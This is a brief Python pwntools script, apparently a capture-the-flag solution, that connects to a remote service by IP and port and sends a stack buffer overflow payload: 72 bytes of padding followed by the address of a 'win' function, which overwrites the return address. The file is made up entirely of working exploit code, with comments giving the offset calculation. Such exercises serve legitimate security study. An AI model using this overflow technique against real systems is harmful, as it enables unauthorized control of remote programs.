#!/usr/bin/env python3
from pwn import *

conn = remote('140.113.207.240',8834)
conn.recvuntil('Your spell: ')
"""
$ gdb tp
> p win
"""
address = 0x4011b6
# overwrite 64 bytes input, 8 bytes alignment, 8 bytes fp
conn.sendline(b'0' * (64 + 8) + p64(address))
print (conn.recv())
conn.recvline()
conn.recvline()
conn.close()